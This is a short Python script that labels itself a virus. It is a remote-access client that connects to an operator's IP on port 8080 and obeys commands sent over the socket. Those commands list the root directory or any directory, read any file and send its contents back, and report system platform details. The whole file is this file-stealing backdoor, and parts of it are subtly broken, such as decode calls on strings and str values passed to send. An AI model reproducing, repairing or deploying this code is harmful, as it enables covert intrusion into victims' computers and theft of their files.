import socket 
import os 
import ast 
import platform

s = socket.socket()
ip = "" #Your main PC ip
port = 8080
s.connect((ip,port))

if s.connect:
    print('Virus Activated')

else:
    exit()


while True:
    incomming_message = s.recv(1024)
    incomming_message = incomming_message.decode()
    incomming_message = ast.literal_eval(incomming_message)

    if incomming_message[0] == 'sfid':
        dir_list = os.listdir("/")
        end = str(['sfid',dir_list])
        end = end.decode()
        s.send(end)

    elif incomming_message[0] == 'jf':
        myDir = os.listdir(incomming_message[1])
        end = str(['jf',myDir])
        end = end.decode()
        s.send(end)

    elif incomming_message[0] == 'td':

        file_path = incomming_message[1]
        fo = open(file_path,'rb')
        content = fo.read()
        end = str(['td',"""{}""".format(content)])
        s.send(end)

    elif incomming_message[0] == 'si':
        platform = str(platform.platform())
        end = str(['si',platform])
        end = end.decode()
        s.send(end)

    else:
        s.send('Something wrong with commands'.encode())

